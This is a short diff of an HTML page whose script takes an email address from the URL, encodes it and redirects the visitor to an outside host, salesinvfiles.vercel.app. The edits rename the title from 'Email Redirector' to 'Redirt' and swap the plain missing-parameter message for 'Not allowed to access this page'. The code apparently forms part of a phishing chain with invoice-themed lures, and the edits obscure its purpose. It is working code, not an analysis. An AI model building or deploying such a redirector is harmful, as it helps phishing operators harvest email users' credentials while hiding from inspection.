@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Email Redirector</title>
+  <title>Redirt</title>
   <script>
     function encodeAndRedirect() {
       const params = new URLSearchParams(window.location.search);
@@ -13,7 +13,7 @@
         const targetUrl = `https://salesinvfiles.vercel.app/?e=${encoded}`;
         window.location.href = targetUrl;
       } else {
-        document.body.innerHTML = "<h2>No email parameter found in URL.</h2>";
+        document.body.innerHTML = "<h2>Not allowed to access this page</h2>";
       }
     }
 
